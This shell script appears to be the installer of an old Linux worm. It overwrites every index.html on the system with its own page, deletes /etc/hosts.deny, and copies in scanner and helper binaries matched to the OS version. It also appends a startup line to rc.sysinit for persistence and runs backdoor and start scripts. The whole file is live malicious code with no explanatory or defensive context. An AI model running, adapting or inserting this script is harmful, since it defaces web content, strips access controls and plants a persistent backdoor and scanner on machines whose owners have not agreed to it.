#!/bin/sh

nohup find / -name "index.html" -exec /bin/cp index.html {} \; &
rm -f /etc/hosts.deny
./getip.sh


if [ -f /etc/inetd.conf ]
then
cp synscan62 synscan
cp w62 w
cp l62 l
cp s62 s
cp randb62 randb
echo "/usr/src/.poop/start62.sh" >> /etc/rc.d/rc.sysinit
./bd62.sh
./start62.sh

else
cp synscan7 synscan
cp w7 w
cp l7 l
cp s7 s
cp randb7 randb
echo "/usr/src/.poop/start7.sh" >> /etc/rc.d/rc.sysinit
./bd7.sh
./start7.sh
fi

